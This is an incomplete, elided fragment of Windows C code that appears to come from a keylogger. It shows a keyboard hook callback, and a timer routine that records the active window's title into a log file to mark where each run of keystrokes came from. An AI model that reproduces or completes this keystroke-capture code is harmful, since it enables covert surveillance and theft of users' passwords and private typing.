...
(int code, WPARAM wParam, LPARAM lParam)
{
	...
	if(!(lParam >> 31))
	{
		char *keyw = (char *)calloc(STR_MAX, sizeof(char));
						 ...
						 DWORD dwTime)
{
	if(GetForegroundWindow() != ForegroundWindow)
	{
		...
		int size = GetWindowTextLength(ForegroundWindow);
		char *WindowName = (char *)calloc(size+1,sizeof(char));
		size = GetWindowText(ForegroundWindow, WindowName, size);
		char *str = (char *)calloc(size+STR_MAX,sizeof(char));
		if(WindowName)
			sprintf(str,"\r\n\r\n<< %s >>\r\n",WindowName);
		WriteToFile(str);
		free(WindowName);
